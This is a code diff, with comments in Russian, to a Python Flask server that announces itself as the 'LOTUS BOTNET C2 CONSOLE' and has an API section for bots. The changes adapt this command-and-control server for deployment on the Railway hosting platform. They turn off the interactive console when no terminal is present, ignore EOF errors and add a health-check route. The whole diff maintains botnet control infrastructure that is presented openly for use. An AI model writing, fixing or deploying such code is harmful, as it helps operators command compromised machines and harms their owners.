@@ -6,6 +6,7 @@ from datetime import datetime
 import threading
 import queue
 import os
+import sys
 
 app = Flask(__name__)
 
@@ -50,12 +51,17 @@ def init_db():
 init_db()
 
 # ============================================================
-# КОМАНДНАЯ КОНСОЛЬ (ЧЕРЕЗ CMD)
+# КОМАНДНАЯ КОНСОЛЬ (ЧЕРЕЗ CMD) - ТОЛЬКО ДЛЯ ЛОКАЛЬНОГО РЕЖИМА
 # ============================================================
 
 command_queue = queue.Queue()
 
 def cmd_console():
+    # Проверяем, запущено ли приложение в интерактивном режиме
+    if not sys.stdin.isatty() or os.environ.get('RAILWAY_ENVIRONMENT') or os.environ.get('RAILWAY_SERVICE'):
+        print("[CONSOLE] Запуск в неинтерактивном режиме (Railway) - консоль отключена")
+        return
+    
     print("\n" + "="*50)
     print("🐍 LOTUS BOTNET C2 CONSOLE")
     print("="*50)
@@ -107,6 +113,10 @@ def cmd_console():
                 break
             else:
                 print("Неизвестная команда. Введите help")
+        except EOFError:
+            # На Railway stdin недоступен - просто игнорируем
+            time.sleep(60)
+            continue
         except Exception as e:
             print(f"Ошибка: {e}")
 
@@ -160,10 +170,13 @@ def clear_logs():
     print("Логи очищены")
 
 # ============================================================
-# ЗАПУСК КОНСОЛИ В ОТДЕЛЬНОМ ПОТОКЕ
+# ЗАПУСК КОНСОЛИ В ОТДЕЛЬНОМ ПОТОКЕ - ТОЛЬКО ЕСЛИ НЕ RAILWAY
 # ============================================================
 
-threading.Thread(target=cmd_console, daemon=True).start()
+if not os.environ.get('RAILWAY_ENVIRONMENT') and not os.environ.get('RAILWAY_SERVICE'):
+    threading.Thread(target=cmd_console, daemon=True).start()
+else:
+    print("[RAILWAY] Запуск в режиме веб-сервера без интерактивной консоли")
 
 # ============================================================
 # API ДЛЯ БОТОВ
@@ -353,6 +366,10 @@ def api_cmd_console():
             elif parts[0] == 'list':
                 show_bots()
     return 'OK'
+
+@app.route('/health')
+def health():
+    return 'OK', 200
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=False)
